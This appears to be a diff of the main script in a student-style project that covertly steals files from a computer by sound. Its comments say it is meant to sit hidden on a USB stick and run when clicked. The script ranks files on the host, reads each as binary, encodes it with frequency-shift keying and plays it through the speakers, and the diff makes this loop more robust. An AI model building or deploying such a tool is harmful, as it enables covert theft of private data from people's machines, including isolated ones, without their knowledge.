@@ -1,25 +1,31 @@
 # this is the final script that will be used to run the entire project
-# it should be a hidden file on a disk on key that will run directly from the disk on key after clicked on when connected to a computer
+# it should be a hidden file on a disk on key that will run directly from the disk
+# on key after clicked on when connected to a computer
 import create_audio_file_from_binary
 import find_data
 import wav_file_stuff
-import find_data
 import bfsk
 import sounddevice as sd
 from nltk.corpus import words
+import nltk
 
 Fs = 44000  # Sampling frequency (Hz)
 
 
 def use_modulation(binary_data):
+    print("Modulating data...")
     return bfsk.generate_bfsk_signal(binary_data, 1000, 2000, Fs, 1, 1)
 
 
 def get_all_paths():
-    print('penis0')
-    paths_in_order2 = find_data.rank_files(find_data.list_files_in_directory())
-    print('penis1')
-    return paths_in_order2
+    print('Getting all paths...')
+    try:
+        paths_in_order2 = find_data.rank_files(find_data.list_files_in_directory())
+        print('Paths obtained successfully')
+        return paths_in_order2
+    except Exception as e:
+        print(f"Error in getting paths: {e}")
+        return []
 
 
 def send_accoustic_signal(path):
@@ -28,15 +34,21 @@ def send_accoustic_signal(path):
     :param path:
     :return:
     '''
-    # get the binary data from the file
-    binary_data = create_audio_file_from_binary.read_file_as_binary(path)
-    # modulate the data
-    modulated_data = use_modulation(binary_data)
-    # send the data
-    sd.play(modulated_data, Fs)
-    '''wav_file_path = wav_file_stuff.create_wav_file(modulated_data)
-    # now run the wav file:
-    # wav_file_stuff.play_wav_file(wav_file_path)'''
+    try:
+        # get the binary data from the file
+        binary_data = create_audio_file_from_binary.read_file_as_binary(path)
+        print(f"Binary data read from {path}")
+        # modulate the data
+        modulated_data = use_modulation(binary_data)
+        print("Data modulated")
+        # send the data
+        sd.play(modulated_data, Fs)
+        sd.wait()  # Wait until the audio is done playing
+        print("Data sent acoustically")
+        return 0
+    except Exception as e:
+        print(f"Error in sending acoustic signal: {e}")
+        return -1
 
 
 def send_accoustic_signal_from_data(modulated_data):
@@ -45,17 +57,28 @@ def send_accoustic_signal_from_data(modulated_data):
     :param path:
     :return:
     '''
-    sd.play(modulated_data, Fs)
-    '''wav_file_path = wav_file_stuff.create_wav_file(modulated_data)
-    # now run the wav file:
-    # wav_file_stuff.play_wav_file(wav_file_path)'''
+    try:
+        sd.play(modulated_data, Fs)
+        sd.wait()  # Wait until the audio is done playing
+        print("Data sent acoustically from provided modulated data")
+        return 0
+    except Exception as e:
+        print(f"Error in sending acoustic signal from data: {e}")
+        return -1
 
 
 if __name__ == '__main__':
-    print('penis000')
-    # TODO: uncomment
-    # nltk.download("words")
+    print('Starting script...')
+    try:
+        # Ensure nltk words are available
+        nltk.download("words")
+        print("NLTK words downloaded")
+    except Exception as e:
+        print(f"Error downloading NLTK words: {e}")
+
     paths_in_order = get_all_paths()
     for path in paths_in_order:
-        print(1)
+        print(f"Processing file: {path}")
         send_accoustic_signal(path)
+    print("Script finished")
+    exit(0)
